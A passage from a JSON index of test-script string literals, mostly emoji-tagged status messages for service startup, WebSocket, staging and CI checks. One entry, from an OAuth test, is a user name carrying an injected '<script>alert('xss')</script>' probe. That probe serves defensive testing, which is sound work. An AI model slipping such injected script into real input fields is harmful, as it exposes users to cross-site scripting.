      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:111"
      ]
    },
    "✅ SUCCESS | Auth service started": {
      "value": "✅ SUCCESS | Auth service started",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:74"
      ]
    },
    "✅ SUCCESS | Auth system is ready": {
      "value": "✅ SUCCESS | Auth system is ready",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:95"
      ]
    },
    "✅ SUCCESS | Backend is ready": {
      "value": "✅ SUCCESS | Backend is ready",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:87"
      ]
    },
    "✅ SUCCESS | Backend service started": {
      "value": "✅ SUCCESS | Backend service started",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:69"
      ]
    },
    "✅ Service dependency ordering": {
      "value": "✅ Service dependency ordering",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:416"
      ]
    },
    "✅ Service discovery timing issues": {
      "value": "✅ Service discovery timing issues",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:419"
      ]
    },
    "✅ Services started successfully": {
      "value": "✅ Services started successfully",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:136"
      ]
    },
    "✅ Services stopped": {
      "value": "✅ Services stopped",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:475"
      ]
    },
    "✅ Simple replay attacks: BLOCKED": {
      "value": "✅ Simple replay attacks: BLOCKED",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:462"
      ]
    },
    "✅ Successfully fixed test_utils imports!": {
      "value": "✅ Successfully fixed test_utils imports!",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_utils_imports.py:96"
      ]
    },
    "✅ Syntax valid": {
      "value": "✅ Syntax valid",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:128"
      ]
    },
    "✅ TEST PASSED | Service startup orchestration test completed successfully in": {
      "value": "✅ TEST PASSED | Service startup orchestration test completed successfully in",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:139"
      ]
    },
    "✅ Test audit report generated:": {
      "value": "✅ Test audit report generated:",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:271"
      ]
    },
    "✅ Thread created:": {
      "value": "✅ Thread created:",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:343"
      ]
    },
    "✅ WebSocket connection authenticated": {
      "value": "✅ WebSocket connection authenticated",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:299"
      ]
    },
    "✓": {
      "value": "✓",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:229"
      ]
    },
    "✓ All components are implemented and working": {
      "value": "✓ All components are implemented and working",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:220"
      ]
    },
    "✓ All files have correct import order!": {
      "value": "✓ All files have correct import order!",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_import_order.py:97"
      ]
    },
    "✓ All syntax errors fixed!": {
      "value": "✓ All syntax errors fixed!",
      "category": "test_literals",
      "locations": [
        "scripts/fix_all_test_issues.py:293"
      ]
    },
    "✓ Anti-patterns to avoid": {
      "value": "✓ Anti-patterns to avoid",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:164"
      ]
    },
    "✓ Environment set to 'staging'": {
      "value": "✓ Environment set to 'staging'",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:189"
      ]
    },
    "✓ Examples and documentation provided": {
      "value": "✓ Examples and documentation provided",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:223"
      ]
    },
    "✓ File is compliant with size limits!": {
      "value": "✓ File is compliant with size limits!",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:45"
      ]
    },
    "✓ File splitting strategies": {
      "value": "✓ File splitting strategies",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:163"
      ]
    },
    "✓ Fixed mock component function in": {
      "value": "✓ Fixed mock component function in",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:162"
      ]
    },
    "✓ Functions under 8 lines": {
      "value": "✓ Functions under 8 lines",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:159"
      ]
    },
    "✓ Helper method extraction": {
      "value": "✓ Helper method extraction",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:160"
      ]
    },
    "✓ Integration with test runner is complete": {
      "value": "✓ Integration with test runner is complete",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:126",
        "scripts/compliance/demo_test_size_enforcement.py:222"
      ]
    },
    "✓ Parametrized tests": {
      "value": "✓ Parametrized tests",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:161"
      ]
    },
    "✓ Password has sufficient length": {
      "value": "✓ Password has sufficient length",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:181"
      ]
    },
    "✓ Pre-run validation function is available": {
      "value": "✓ Pre-run validation function is available",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:125"
      ]
    },
    "✓ Proper fixture usage": {
      "value": "✓ Proper fixture usage",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:162"
      ]
    },
    "✓ Received response:": {
      "value": "✓ Received response:",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_simple.py:33"
      ]
    },
    "✓ Reduced mocking in": {
      "value": "✓ Reduced mocking in",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:167"
      ]
    },
    "✓ Test already passing": {
      "value": "✓ Test already passing",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:285"
      ]
    },
    "✓ Test size limits enforcement is fully functional": {
      "value": "✓ Test size limits enforcement is fully functional",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:221"
      ]
    },
    "✓ This is the correct method for GCP Cloud Run": {
      "value": "✓ This is the correct method for GCP Cloud Run",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:164"
      ]
    },
    "✓ Updated:": {
      "value": "✓ Updated:",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:223"
      ]
    },
    "✓ Using Cloud SQL Unix socket connection": {
      "value": "✓ Using Cloud SQL Unix socket connection",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:163"
      ]
    },
    "✓ Using standard 'postgres' user": {
      "value": "✓ Using standard 'postgres' user",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:176"
      ]
    },
    "✓ WebSocket connection established!": {
      "value": "✓ WebSocket connection established!",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_simple.py:19"
      ]
    },
    "✓ WebSocket test passed!": {
      "value": "✓ WebSocket test passed!",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_simple.py:58"
      ]
    },
    "✗": {
      "value": "✗",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:232",
        "auth_service/test_url_construction.py:234"
      ]
    },
    "✗ Connection refused:": {
      "value": "✗ Connection refused:",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_simple.py:40"
      ]
    },
    "✗ Environment not set to 'staging'": {
      "value": "✗ Environment not set to 'staging'",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:191"
      ]
    },
    "✗ Error getting database URL:": {
      "value": "✗ Error getting database URL:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:168"
      ]
    },
    "✗ Invalid status code:": {
      "value": "✗ Invalid status code:",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_simple.py:43"
      ]
    },
    "✗ No password configured": {
      "value": "✗ No password configured",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:185"
      ]
    },
    "✗ No response received within 5 seconds": {
      "value": "✗ No response received within 5 seconds",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_simple.py:36"
      ]
    },
    "✗ Not using Cloud SQL socket - this could be the issue": {
      "value": "✗ Not using Cloud SQL socket - this could be the issue",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:166"
      ]
    },
    "✗ Unexpected error:": {
      "value": "✗ Unexpected error:",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_simple.py:46"
      ]
    },
    "✗ WebSocket test failed!": {
      "value": "✗ WebSocket test failed!",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_simple.py:61"
      ]
    },
    "❌": {
      "value": "❌",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:65",
        "scripts/test_coordination_fixes.py:389",
        "scripts/test_example_message_flow.py:115",
        "scripts/test_example_message_flow.py:322",
        "scripts/test_staging_env.py:190",
        "scripts/unified_test_runner.py:656"
      ]
    },
    "❌ (FAILING)": {
      "value": "❌ (FAILING)",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:883"
      ]
    },
    "❌ ACT not found. Please install ACT first.": {
      "value": "❌ ACT not found. Please install ACT first.",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:47"
      ]
    },
    "❌ Configuration error:": {
      "value": "❌ Configuration error:",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:242"
      ]
    },
    "❌ Docker not found or not running.": {
      "value": "❌ Docker not found or not running.",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:64"
      ]
    },
    "❌ Dry run failed:": {
      "value": "❌ Dry run failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:175"
      ]
    },
    "❌ E2E test failed:": {
      "value": "❌ E2E test failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:104"
      ]
    },
    "❌ Error checking ACT:": {
      "value": "❌ Error checking ACT:",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:50"
      ]
    },
    "❌ Error checking Docker:": {
      "value": "❌ Error checking Docker:",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:67"
      ]
    },
    "❌ Error:": {
      "value": "❌ Error:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:324"
      ]
    },
    "❌ Exiting with error code due to": {
      "value": "❌ Exiting with error code due to",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:460"
      ]
    },
    "❌ Exiting with error:": {
      "value": "❌ Exiting with error:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:605"
      ]
    },
    "❌ FAIL": {
      "value": "❌ FAIL",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:486"
      ]
    },
    "❌ FAILED": {
      "value": "❌ FAILED",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:148",
        "scripts/test_staging_env.py:173",
        "scripts/unified_test_runner.py:698",
        "scripts/unified_test_runner.py:703"
      ]
    },
    "❌ FAILED | Backend service failed to start": {
      "value": "❌ FAILED | Backend service failed to start",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:71"
      ]
    },
    "❌ FAILED | Database validation failed": {
      "value": "❌ FAILED | Database validation failed",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:55"
      ]
    },
    "❌ FAILED | Environment check failed": {
      "value": "❌ FAILED | Environment check failed",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:42"
      ]
    },
    "❌ FAILED | No services started successfully": {
      "value": "❌ FAILED | No services started successfully",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:107"
      ]
    },
    "❌ Failed Workflows:": {
      "value": "❌ Failed Workflows:",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:343"
      ]
    },
    "❌ Failed to fix": {
      "value": "❌ Failed to fix",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:178"
      ]
    },
    "❌ Failed:": {
      "value": "❌ Failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:335"
      ]
    },
    "❌ Found": {
      "value": "❌ Found",
      "category": "test_literals",
      "locations": [
        "scripts/ci/check_test_stubs.py:61",
        "scripts/compliance/real_test_linter.py:117",
        "scripts/iterative_test_fix_loop.py:117"
      ]
    },
    "❌ Handler initialization error:": {
      "value": "❌ Handler initialization error:",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:267"
      ]
    },
    "❌ Handler initialization failed": {
      "value": "❌ Handler initialization failed",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:261"
      ]
    },
    "❌ Import error:": {
      "value": "❌ Import error:",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:223"
      ]
    },
    "❌ Message validation error:": {
      "value": "❌ Message validation error:",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:303"
      ]
    },
    "❌ Message validation failed": {
      "value": "❌ Message validation failed",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:297"
      ]
    },
    "❌ Prerequisites check failed": {
      "value": "❌ Prerequisites check failed",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:276"
      ]
    },
    "❌ Quick validation failed:": {
      "value": "❌ Quick validation failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:423"
      ]
    },
    "❌ SOME TESTS FAILED": {
      "value": "❌ SOME TESTS FAILED",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:361"
      ]
    },
    "❌ STAGING TESTS FAILED (exit code:": {
      "value": "❌ STAGING TESTS FAILED (exit code:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:113"
      ]
    },
    "❌ Services failed to become healthy within timeout": {
      "value": "❌ Services failed to become healthy within timeout",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:168"
      ]
    },
    "❌ Some coordination fixes failed validation": {
      "value": "❌ Some coordination fixes failed validation",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:423"
      ]
    },
    "❌ Syntax error:": {
      "value": "❌ Syntax error:",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:132"
      ]
    },
    "❌ TEST FAILED | Service startup orchestration test failed after": {
      "value": "❌ TEST FAILED | Service startup orchestration test failed after",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:142"
      ]
    },
    "❌ Test error:": {
      "value": "❌ Test error:",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:182"
      ]
    },
    "❌ Test file not found:": {
      "value": "❌ Test file not found:",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:83"
      ]
    },
    "❌ Validation error:": {
      "value": "❌ Validation error:",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:139"
      ]
    },
    "❌ WebSocket manager not available": {
      "value": "❌ WebSocket manager not available",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:236"
      ]
    },
    "测试用户 🚀 <script>alert('xss')</script>": {
      "value": "测试用户 🚀 <script>alert('xss')</script>",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1231"
      ]
    },
    "🎉 ALL COORDINATION FIXES VALIDATED SUCCESSFULLY!": {
      "value": "🎉 ALL COORDINATION FIXES VALIDATED SUCCESSFULLY!",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:414"
      ]
    },
    "🎉 ALL TESTS PASSED!": {
      "value": "🎉 ALL TESTS PASSED!",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:493",
        "scripts/test_example_message_flow.py:355"
      ]
    },
    "🎉 All tests passed! Staging environment is fully operational.": {
      "value": "🎉 All tests passed! Staging environment is fully operational.",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:193"
      ]
    },
    "🎉 All tests passing after": {
      "value": "🎉 All tests passing after",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:150"
      ]
    },
    "🎉 Quick validation passed!": {
      "value": "🎉 Quick validation passed!",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:419"
      ]
    },
    "🎯 Focus on testing real business logic, not mocks or constants": {
      "value": "🎯 Focus on testing real business logic, not mocks or constants",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:220"
      ]
    },
    "🎯 PHASE 6 | Testing service readiness...": {
      "value": "🎯 PHASE 6 | Testing service readiness...",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:79"
      ]
    },
    "🏁 TESTING COMPLETE | Service startup orchestration test finished": {
      "value": "🏁 TESTING COMPLETE | Service startup orchestration test finished",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:99"
      ]
    },
    "💡 *": {
      "value": "💡 *",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:530"
      ]
    },
    "💡 Suggested fixes:": {
      "value": "💡 Suggested fixes:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:145"
      ]
    },
    "💡 To fix these issues:": {
      "value": "💡 To fix these issues:",
      "category": "test_literals",
      "locations": [
        "scripts/ci/check_test_stubs.py:84"
      ]
    },
    "💥": {
      "value": "💥",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:70",
        "scripts/test_example_message_flow.py:323"
      ]
    },
    "💥 ERROR | Test failed with exception:": {
      "value": "💥 ERROR | Test failed with exception:",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:111"
      ]
    },
    "💥 Error running": {
      "value": "💥 Error running",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:125"
      ]
    },
    "💬 Testing chat message flow...": {
      "value": "💬 Testing chat message flow...",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:311"
      ]
    },
    "💾 PHASE 3 | Database validation...": {
      "value": "💾 PHASE 3 | Database validation...",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:51"
      ]
    },
    "💾 Report saved to:": {
      "value": "💾 Report saved to:",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:363"
      ]
    },
    "💾 Saved fixes to": {
      "value": "💾 Saved fixes to",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:265"
      ]
    },
    "📁": {
      "value": "📁",
      "category": "test_literals",
      "locations": [
        "scripts/ci/check_test_stubs.py:71",
        "scripts/ci/check_test_stubs.py:79"
      ]
    },
    "📄 JSON report saved to:": {
      "value": "📄 JSON report saved to:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:600"
      ]
    },
    "📈 **Success Metric:** Reduce violations from": {
      "value": "📈 **Success Metric:** Reduce violations from",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:570"
      ]
    },
    "📈 DETAILED METRICS": {
      "value": "📈 DETAILED METRICS",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:350"
      ]
    },
    "📊 Found": {
      "value": "📊 Found",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:280"
      ]
    },
    "📊 Summary:": {
      "value": "📊 Summary:",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:276",
        "scripts/test_workflows_with_act.py:332"
      ]
    },
    "📊 TEST RESULTS SUMMARY": {
      "value": "📊 TEST RESULTS SUMMARY",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:311"
      ]
    },
    "📋 MEDIUM: Schedule": {
      "value": "📋 MEDIUM: Schedule",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:207"
      ]
    },
    "📋 PHASE 1 | Environment and pre-checks...": {
      "value": "📋 PHASE 1 | Environment and pre-checks...",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:38"
      ]
    },
    "📋 Running": {
      "value": "📋 Running",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:58"
      ]
    },
    "📋 Test Report": {
      "value": "📋 Test Report",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:325"
      ]
    },
    "📍 Line": {
      "value": "📍 Line",
      "category": "test_literals",
      "locations": [
        "scripts/ci/check_test_stubs.py:72",
        "scripts/ci/check_test_stubs.py:80"
      ]
    },
    "📖 Review SPEC/testing.xml for detailed fake test guidance": {
      "value": "📖 Review SPEC/testing.xml for detailed fake test guidance",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:219"
      ]
    },
    "📚 Use patterns from app/tests/examples/test_real_functionality_examples.py": {
      "value": "📚 Use patterns from app/tests/examples/test_real_functionality_examples.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:217"
      ]
    },
    "📝 Validating syntax:": {
      "value": "📝 Validating syntax:",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:110"
      ]
    },
    "📦 Starting services with dev launcher...": {
      "value": "📦 Starting services with dev launcher...",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:112"
      ]
    },
    "🔄 PHASE 4 | Migration check...": {
      "value": "🔄 PHASE 4 | Migration check...",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:58"
      ]
    },
    "🔌 Testing WebSocket connection...": {
      "value": "🔌 Testing WebSocket connection...",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:263"
      ]
    },
    "🔍 Add fake test detection to CI pipeline to prevent regressions": {
      "value": "🔍 Add fake test detection to CI pipeline to prevent regressions",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:218"
      ]
    },
    "🔍 Checking prerequisites...": {
      "value": "🔍 Checking prerequisites...",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:34"
      ]
    },
    "🔍 Running Quick Validation Checks": {
      "value": "🔍 Running Quick Validation Checks",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:370"
      ]
    },
    "🔍 Running Validation Checks": {
      "value": "🔍 Running Validation Checks",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:66"
      ]
    },
    "🔐 PHASE 2 | Loading secrets...": {
      "value": "🔐 PHASE 2 | Loading secrets...",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:45"
      ]
    },
    "🔐 SECURITY ASSESSMENT: ROBUST - All major attack vectors are properly mitigated": {
      "value": "🔐 SECURITY ASSESSMENT: ROBUST - All major attack vectors are properly mitigated",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:470"
      ]
    },
    "🔐 Testing authentication...": {
      "value": "🔐 Testing authentication...",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:218"
      ]
    },
    "🔥": {
      "value": "🔥",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:525"
      ]
    },
    "🔥 **": {
      "value": "🔥 **",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:505"
      ]
    },
    "🔥 HIGH": {
      "value": "🔥 HIGH",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:551"
      ]
    },
    "🔥 URGENT: Fix": {
      "value": "🔥 URGENT: Fix",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:329"
      ]
    },
    "🔧 Action:": {
      "value": "🔧 Action:",
      "category": "test_literals",
      "locations": [
        "scripts/ci/check_test_stubs.py:73",
        "scripts/ci/check_test_stubs.py:81"
      ]
    },
    "🔧 Attempting to fix issues in:": {
      "value": "🔧 Attempting to fix issues in:",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:248"
      ]
    },
    "🔧 LOW: Consider consolidating": {
      "value": "🔧 LOW: Consider consolidating",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:212"
      ]
    },
    "🔴": {
      "value": "🔴",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:119",
        "scripts/compliance/real_test_linter.py:141"
      ]
    },
    "🚀 PHASE 5 | Starting services...": {
      "value": "🚀 PHASE 5 | Starting services...",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:64"
      ]
    },
    "🚀 Starting Cold Start E2E Test Suite": {
      "value": "🚀 Starting Cold Start E2E Test Suite",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:73"
      ]
    },
    "🚀 Starting Example Message Flow Test Suite": {
      "value": "🚀 Starting Example Message Flow Test Suite",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:38"
      ]
    },
    "🚀 Starting GitHub Workflows Testing with ACT": {
      "value": "🚀 Starting GitHub Workflows Testing with ACT",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:272"
      ]
    },
    "🚨": {
      "value": "🚨",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:448"
      ]
    },
    "🚨 CRITICAL: Remove": {
      "value": "🚨 CRITICAL: Remove",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:197"
      ]
    },
    "🚨 HIGH SEVERITY (": {
      "value": "🚨 HIGH SEVERITY (",
      "category": "test_literals",
      "locations": [
        "scripts/ci/check_test_stubs.py:69"
      ]
    },
    "🛡️ OAuth Authorization Code Reuse Prevention - Security Analysis Complete": {
      "value": "🛡️ OAuth Authorization Code Reuse Prevention - Security Analysis Complete",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:461"
      ]
    },
    "🟡": {
      "value": "🟡",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:121",
        "scripts/compliance/real_test_linter.py:141"
      ]
    },
    "🟢": {
      "value": "🟢",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:123",
        "scripts/compliance/real_test_linter.py:141"
      ]
    },
    "🤖 Testing model response...": {
      "value": "🤖 Testing model response...",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:372"
      ]
    },
    "🧪 Testing workflow:": {
      "value": "🧪 Testing workflow:",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:144"
      ]
    },
    "🧹 CLEANUP | Shutting down services...": {
      "value": "🧹 CLEANUP | Shutting down services...",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:117"
      ]
    },
    "🧹 Cleaning up...": {
      "value": "🧹 Cleaning up...",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:463"
      ]
    }
  }
}